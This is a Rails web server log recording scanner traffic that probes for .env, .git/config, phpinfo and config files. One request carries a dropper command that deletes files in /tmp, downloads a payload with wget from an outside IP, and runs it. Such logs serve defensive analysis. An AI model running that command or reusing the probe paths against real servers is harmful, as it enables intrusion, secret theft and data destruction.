I, [2023-03-12T06:22:37.975702 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 0.9ms | Allocations: 515)
I, [2023-03-12T06:22:38.273563 #2360580]  INFO -- : Started POST "/" for 34.229.144.89 at 2023-03-12 06:22:38 +0900
F, [2023-03-12T06:22:38.273913 #2360580] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T06:22:38.570500 #2360580]  INFO -- : Started GET "/phpinfo.php" for 34.229.144.89 at 2023-03-12 06:22:38 +0900
I, [2023-03-12T06:22:38.571707 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T06:22:38.571759 #2360580]  INFO -- :   Parameters: {"all"=>"phpinfo"}
I, [2023-03-12T06:22:38.572199 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T06:22:38.573071 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-12T06:22:38.573240 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 513)
I, [2023-03-12T06:22:38.877236 #2360580]  INFO -- : Started POST "/" for 34.229.144.89 at 2023-03-12 06:22:38 +0900
F, [2023-03-12T06:22:38.877584 #2360580] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T06:22:39.179814 #2360582]  INFO -- : Started GET "/info.php" for 34.229.144.89 at 2023-03-12 06:22:39 +0900
I, [2023-03-12T06:22:39.180415 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T06:22:39.180454 #2360582]  INFO -- :   Parameters: {"all"=>"info"}
I, [2023-03-12T06:22:39.180907 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T06:22:39.181571 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T06:22:39.181737 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 514)
I, [2023-03-12T06:22:39.493956 #2360582]  INFO -- : Started POST "/" for 34.229.144.89 at 2023-03-12 06:22:39 +0900
F, [2023-03-12T06:22:39.494291 #2360582] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T06:22:39.796135 #2360580]  INFO -- : Started GET "/php-info" for 34.229.144.89 at 2023-03-12 06:22:39 +0900
I, [2023-03-12T06:22:39.796748 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T06:22:39.796788 #2360580]  INFO -- :   Parameters: {"all"=>"php-info"}
I, [2023-03-12T06:22:39.797967 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T06:22:39.798763 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 298)
I, [2023-03-12T06:22:39.798960 #2360580]  INFO -- : Completed 200 OK in 2ms (Views: 1.2ms | Allocations: 515)
I, [2023-03-12T06:22:40.096308 #2360580]  INFO -- : Started POST "/" for 34.229.144.89 at 2023-03-12 06:22:40 +0900
F, [2023-03-12T06:22:40.096685 #2360580] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T06:38:59.783252 #2360580]  INFO -- : Started GET "/" for 15.204.52.61 at 2023-03-12 06:38:59 +0900
I, [2023-03-12T06:38:59.784056 #2360580]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-12T06:38:59.784495 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T06:38:59.785444 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-03-12T06:38:59.785662 #2360580]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 514)
I, [2023-03-12T07:01:32.483290 #2360582]  INFO -- : Started GET "/.env" for 185.254.196.115 at 2023-03-12 07:01:32 +0900
I, [2023-03-12T07:01:32.483911 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T07:01:32.483949 #2360582]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T07:01:32.484390 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T07:01:32.485173 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-12T07:01:32.485368 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-03-12T07:01:33.267560 #2360580]  INFO -- : Started POST "/" for 185.254.196.115 at 2023-03-12 07:01:33 +0900
F, [2023-03-12T07:01:33.267908 #2360580] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-12T07:10:41.059593 #2360582]  INFO -- : Started HEAD "/" for 167.172.224.104 at 2023-03-12 07:10:41 +0900
I, [2023-03-12T07:10:41.060252 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T07:10:41.060698 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T07:10:41.061419 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-12T07:10:41.061753 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 512)
I, [2023-03-12T07:10:41.878547 #2360582]  INFO -- : Started GET "/_profiler/phpinfo" for 167.172.224.104 at 2023-03-12 07:10:41 +0900
I, [2023-03-12T07:10:41.879267 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T07:10:41.879314 #2360582]  INFO -- :   Parameters: {"all"=>"_profiler/phpinfo"}
I, [2023-03-12T07:10:41.879814 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T07:10:41.880540 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 298)
I, [2023-03-12T07:10:41.880718 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 515)
I, [2023-03-12T07:10:43.068601 #2360580]  INFO -- : Started GET "/.flaskenv" for 167.172.224.104 at 2023-03-12 07:10:43 +0900
I, [2023-03-12T07:10:43.069293 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T07:10:43.069342 #2360580]  INFO -- :   Parameters: {"all"=>".flaskenv"}
I, [2023-03-12T07:10:43.069780 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T07:10:43.070457 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T07:10:43.073573 #2360580]  INFO -- : Completed 200 OK in 4ms (Views: 3.9ms | Allocations: 521)
I, [2023-03-12T07:10:43.854143 #2360580]  INFO -- : Started GET "//config/config.js" for 167.172.224.104 at 2023-03-12 07:10:43 +0900
I, [2023-03-12T07:10:43.854717 #2360580]  INFO -- : Processing by UserController#index as JS
I, [2023-03-12T07:10:43.854756 #2360580]  INFO -- :   Parameters: {"all"=>"config/config"}
I, [2023-03-12T07:10:43.855229 #2360580]  INFO -- :   Rendered user/index.html.erb (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T07:10:43.855383 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 0.4ms | Allocations: 281)
I, [2023-03-12T07:10:44.487745 #2360582]  INFO -- : Started GET "/config/config.json" for 167.172.224.104 at 2023-03-12 07:10:44 +0900
I, [2023-03-12T07:10:44.488631 #2360582]  INFO -- : Processing by UserController#index as JSON
I, [2023-03-12T07:10:44.488712 #2360582]  INFO -- :   Parameters: {"all"=>"config/config"}
I, [2023-03-12T07:10:44.489344 #2360582]  INFO -- : Completed 406 Not Acceptable in 1ms (Allocations: 180)
F, [2023-03-12T07:10:44.490484 #2360582] FATAL -- :   
ActionController::UnknownFormat (UserController#index is missing a template for this request format and variant.

request.formats: ["application/json"]
request.variant: []):
  
actionpack (6.1.4.4) lib/action_controller/metal/implicit_render.rb:42:in `default_render'
actionpack (6.1.4.4) lib/action_controller/metal/basic_implicit_render.rb:6:in `block in send_action'
<internal:kernel>:90:in `tap'
actionpack (6.1.4.4) lib/action_controller/metal/basic_implicit_render.rb:6:in `send_action'
actionpack (6.1.4.4) lib/abstract_controller/base.rb:228:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/rendering.rb:30:in `process_action'
actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:42:in `block in process_action'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:117:in `block in run_callbacks'
actiontext (6.1.4.4) lib/action_text/rendering.rb:20:in `with_renderer'
actiontext (6.1.4.4) lib/action_text/engine.rb:59:in `block (4 levels) in <class:Engine>'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:126:in `instance_exec'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:126:in `block in run_callbacks'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:137:in `run_callbacks'
actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:41:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/rescue.rb:22:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:34:in `block in process_action'
activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `block in instrument'
activesupport (6.1.4.4) lib/active_support/notifications/instrumenter.rb:24:in `instrument'
activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `instrument'
actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:33:in `process_action'
actionpack (6.1.4.4) lib/action_controller/metal/params_wrapper.rb:249:in `process_action'
activerecord (6.1.4.4) lib/active_record/railties/controller_runtime.rb:27:in `process_action'
actionpack (6.1.4.4) lib/abstract_controller/base.rb:165:in `process'
actionview (6.1.4.4) lib/action_view/rendering.rb:39:in `process'
actionpack (6.1.4.4) lib/action_controller/metal.rb:190:in `dispatch'
actionpack (6.1.4.4) lib/action_controller/metal.rb:254:in `dispatch'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:50:in `dispatch'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:33:in `serve'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:50:in `block in serve'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `each'
actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `serve'
actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:842:in `call'
rack (2.2.3) lib/rack/tempfile_reaper.rb:15:in `call'
rack (2.2.3) lib/rack/etag.rb:27:in `call'
rack (2.2.3) lib/rack/conditional_get.rb:27:in `call'
rack (2.2.3) lib/rack/head.rb:12:in `call'
actionpack (6.1.4.4) lib/action_dispatch/http/permissions_policy.rb:22:in `call'
actionpack (6.1.4.4) lib/action_dispatch/http/content_security_policy.rb:18:in `call'
rack (2.2.3) lib/rack/session/abstract/id.rb:266:in `context'
rack (2.2.3) lib/rack/session/abstract/id.rb:260:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/cookies.rb:689:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:27:in `block in call'
activesupport (6.1.4.4) lib/active_support/callbacks.rb:98:in `run_callbacks'
actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:26:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/actionable_exceptions.rb:18:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/debug_exceptions.rb:29:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
railties (6.1.4.4) lib/rails/rack/logger.rb:37:in `call_app'
railties (6.1.4.4) lib/rails/rack/logger.rb:28:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/request_id.rb:26:in `call'
rack (2.2.3) lib/rack/method_override.rb:24:in `call'
rack (2.2.3) lib/rack/runtime.rb:22:in `call'
activesupport (6.1.4.4) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
actionpack (6.1.4.4) lib/action_dispatch/middleware/host_authorization.rb:113:in `call'
railties (6.1.4.4) lib/rails/engine.rb:539:in `call'
puma (5.6.5) lib/puma/configuration.rb:252:in `call'
puma (5.6.5) lib/puma/request.rb:77:in `block in handle_request'
puma (5.6.5) lib/puma/thread_pool.rb:340:in `with_force_shutdown'
puma (5.6.5) lib/puma/request.rb:76:in `handle_request'
puma (5.6.5) lib/puma/server.rb:443:in `process_client'
puma (5.6.5) lib/puma/thread_pool.rb:147:in `block in spawn_thread'
I, [2023-03-12T07:10:45.139101 #2360582]  INFO -- : Started GET "/config.inc.php" for 167.172.224.104 at 2023-03-12 07:10:45 +0900
I, [2023-03-12T07:10:45.139940 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T07:10:45.139997 #2360582]  INFO -- :   Parameters: {"all"=>"config.inc"}
I, [2023-03-12T07:10:45.140554 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T07:10:45.141815 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.3ms | Allocations: 298)
I, [2023-03-12T07:10:45.142004 #2360582]  INFO -- : Completed 200 OK in 2ms (Views: 1.7ms | Allocations: 507)
I, [2023-03-12T07:13:03.815077 #2360582]  INFO -- : Started GET "/.git/config" for 194.180.49.108 at 2023-03-12 07:13:03 +0900
I, [2023-03-12T07:13:03.815993 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T07:13:03.816043 #2360582]  INFO -- :   Parameters: {"all"=>".git/config"}
I, [2023-03-12T07:13:03.816967 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
I, [2023-03-12T07:13:03.817642 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-12T07:13:03.817832 #2360582]  INFO -- : Completed 200 OK in 2ms (Views: 1.5ms | Allocations: 521)
I, [2023-03-12T07:13:04.303224 #2360582]  INFO -- : Started GET "/.git/config" for 194.180.49.108 at 2023-03-12 07:13:04 +0900
I, [2023-03-12T07:13:04.303836 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T07:13:04.303874 #2360582]  INFO -- :   Parameters: {"all"=>".git/config"}
I, [2023-03-12T07:13:04.304541 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T07:13:04.305233 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 298)
I, [2023-03-12T07:13:04.305421 #2360582]  INFO -- : Completed 200 OK in 2ms (Views: 1.1ms | Allocations: 515)
I, [2023-03-12T07:13:08.295282 #2360580]  INFO -- : Started GET "/.git/config" for 194.180.49.108 at 2023-03-12 07:13:08 +0900
I, [2023-03-12T07:13:08.296498 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T07:13:08.296549 #2360580]  INFO -- :   Parameters: {"all"=>".git/config"}
I, [2023-03-12T07:13:08.297074 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T07:13:08.297711 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T07:13:08.297897 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-03-12T07:13:08.809720 #2360580]  INFO -- : Started GET "/.git/config" for 194.180.49.108 at 2023-03-12 07:13:08 +0900
I, [2023-03-12T07:13:08.810324 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T07:13:08.810366 #2360580]  INFO -- :   Parameters: {"all"=>".git/config"}
I, [2023-03-12T07:13:08.810795 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T07:13:08.812360 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.6ms | Allocations: 298)
I, [2023-03-12T07:13:08.812566 #2360580]  INFO -- : Completed 200 OK in 2ms (Views: 1.9ms | Allocations: 515)
I, [2023-03-12T07:36:38.369363 #2360580]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-12 07:36:38 +0900
I, [2023-03-12T07:36:38.369997 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T07:36:38.370037 #2360580]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-12T07:36:38.371811 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T07:36:38.373334 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.6ms | Allocations: 299)
I, [2023-03-12T07:36:38.373519 #2360580]  INFO -- : Completed 200 OK in 3ms (Views: 3.2ms | Allocations: 505)
I, [2023-03-12T07:46:35.374796 #2360582]  INFO -- : Started GET "/" for 94.102.51.9 at 2023-03-12 07:46:35 +0900
I, [2023-03-12T07:46:35.375400 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T07:46:35.375843 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T07:46:35.376472 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T07:46:35.376653 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-12T07:46:38.019092 #2360580]  INFO -- : Started GET "/" for 94.102.51.9 at 2023-03-12 07:46:38 +0900
I, [2023-03-12T07:46:38.019918 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T07:46:38.020761 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T07:46:38.022974 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 2.3ms | Allocations: 299)
I, [2023-03-12T07:46:38.023188 #2360580]  INFO -- : Completed 200 OK in 3ms (Views: 2.9ms | Allocations: 521)
I, [2023-03-12T07:59:53.831900 #2360582]  INFO -- : Started GET "/" for 205.210.31.142 at 2023-03-12 07:59:53 +0900
I, [2023-03-12T07:59:53.832473 #2360582]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-12T07:59:53.832918 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T07:59:53.833556 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T07:59:53.836523 #2360582]  INFO -- : Completed 200 OK in 4ms (Views: 1.0ms | Allocations: 513)
I, [2023-03-12T08:40:47.110069 #2360582]  INFO -- : Started GET "/shell?cd+/tmp;rm+-rf+*;wget+128.199.134.42/jaws;sh+/tmp/jaws" for 103.178.229.137 at 2023-03-12 08:40:47 +0900
I, [2023-03-12T08:40:47.111007 #2360582]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-12T08:40:47.111059 #2360582]  INFO -- :   Parameters: {"cd /tmp"=>nil, "rm -rf *"=>nil, "wget 128.199.134.42/jaws"=>nil, "sh /tmp/jaws"=>nil, "all"=>"shell"}
I, [2023-03-12T08:40:47.111481 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T08:40:47.112093 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T08:40:47.112261 #2360582]  INFO -- : Completed 200 OK in 1ms (Views: 0.9ms | Allocations: 514)
I, [2023-03-12T08:53:22.273325 #2360580]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-12 08:53:22 +0900
I, [2023-03-12T08:53:22.274014 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T08:53:22.274059 #2360580]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-12T08:53:22.274771 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T08:53:22.276906 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 2.3ms | Allocations: 299)
I, [2023-03-12T08:53:22.277091 #2360580]  INFO -- : Completed 200 OK in 3ms (Views: 2.7ms | Allocations: 505)
I, [2023-03-12T09:36:15.232550 #2360582]  INFO -- : Started HEAD "/" for 51.255.196.208 at 2023-03-12 09:36:15 +0900
I, [2023-03-12T09:36:15.233285 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T09:36:15.240652 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T09:36:15.241444 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-12T09:36:15.241666 #2360582]  INFO -- : Completed 200 OK in 8ms (Views: 8.1ms | Allocations: 512)
I, [2023-03-12T09:36:16.078358 #2360580]  INFO -- : Started GET "/manager/html" for 51.255.196.208 at 2023-03-12 09:36:16 +0900
I, [2023-03-12T09:36:16.079080 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T09:36:16.079131 #2360580]  INFO -- :   Parameters: {"all"=>"manager/html"}
I, [2023-03-12T09:36:16.079593 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T09:36:16.080400 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-12T09:36:16.080589 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-03-12T09:39:55.840354 #2360582]  INFO -- : Started GET "/" for 139.162.84.205 at 2023-03-12 09:39:55 +0900
I, [2023-03-12T09:39:55.841011 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T09:39:55.841492 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T09:39:55.842544 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.1ms | Allocations: 299)
I, [2023-03-12T09:39:55.842730 #2360582]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 521)
I, [2023-03-12T10:10:19.588527 #2360580]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-12 10:10:19 +0900
I, [2023-03-12T10:10:19.589191 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T10:10:19.589236 #2360580]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-12T10:10:19.589666 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T10:10:19.590300 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-12T10:10:19.590446 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 505)
I, [2023-03-12T10:47:44.224677 #2360582]  INFO -- : Started GET "/" for 178.150.30.10 at 2023-03-12 10:47:44 +0900
I, [2023-03-12T10:47:44.225329 #2360582]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-12T10:47:44.225953 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T10:47:44.227929 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 2.0ms | Allocations: 299)
I, [2023-03-12T10:47:44.228126 #2360582]  INFO -- : Completed 200 OK in 3ms (Views: 2.3ms | Allocations: 513)
I, [2023-03-12T11:27:27.301066 #2360580]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-12 11:27:27 +0900
I, [2023-03-12T11:27:27.301702 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T11:27:27.301909 #2360580]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-12T11:27:27.302442 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T11:27:27.303378 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 298)
I, [2023-03-12T11:27:27.303557 #2360580]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 504)
I, [2023-03-12T12:25:50.162350 #2360582]  INFO -- : Started GET "/" for 205.210.31.130 at 2023-03-12 12:25:50 +0900
I, [2023-03-12T12:25:50.163009 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T12:25:50.163620 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T12:25:50.164486 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-12T12:25:50.164713 #2360582]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 521)
I, [2023-03-12T12:43:06.549049 #2360580]  INFO -- : Started HEAD "/.env" for 91.223.227.140 at 2023-03-12 12:43:06 +0900
I, [2023-03-12T12:43:06.549741 #2360580]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-12T12:43:06.549891 #2360580]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T12:43:06.550382 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T12:43:06.551709 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.3ms | Allocations: 298)
I, [2023-03-12T12:43:06.552206 #2360580]  INFO -- : Completed 200 OK in 2ms (Views: 2.0ms | Allocations: 502)
I, [2023-03-12T12:43:07.114319 #2360580]  INFO -- : Started GET "/.env" for 91.223.227.140 at 2023-03-12 12:43:07 +0900
I, [2023-03-12T12:43:07.114906 #2360580]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-12T12:43:07.114945 #2360580]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-12T12:43:07.115340 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T12:43:07.116131 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 297)
I, [2023-03-12T12:43:07.116298 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 504)
I, [2023-03-12T12:44:37.835393 #2360580]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-12 12:44:37 +0900
I, [2023-03-12T12:44:37.835996 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T12:44:37.836037 #2360580]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-12T12:44:37.836453 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T12:44:37.837225 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 298)
I, [2023-03-12T12:44:37.837380 #2360580]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 504)
I, [2023-03-12T13:42:35.127724 #2360582]  INFO -- : Started GET "/" for 139.162.84.205 at 2023-03-12 13:42:35 +0900
I, [2023-03-12T13:42:35.128612 #2360582]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T13:42:35.129139 #2360582]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T13:42:35.130761 #2360582]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.7ms | Allocations: 299)
I, [2023-03-12T13:42:35.130952 #2360582]  INFO -- : Completed 200 OK in 2ms (Views: 2.0ms | Allocations: 521)
I, [2023-03-12T14:01:46.347519 #2360580]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-12 14:01:46 +0900
I, [2023-03-12T14:01:46.348107 #2360580]  INFO -- : Processing by UserController#index as */*
I, [2023-03-12T14:01:46.348146 #2360580]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-12T14:01:46.348680 #2360580]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-12T14:01:46.349738 #2360580]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.1ms | Allocations: 298)
I, [2023-03-12T14:01:46.349892 #2360580]  INFO -- : Completed 200 OK in 2ms (Views: 1.5ms | Allocations: 504)
I, [2023-03-12T14:03:16.422111 #2360582]  INFO -- : Started GET "/" for 34.76.158.233 at 2023-03-12 14:03:16 +0900
I, [2023-03-12T14:03:16.422711 #2360582]  INFO -- : Processing by UserController#index as */*
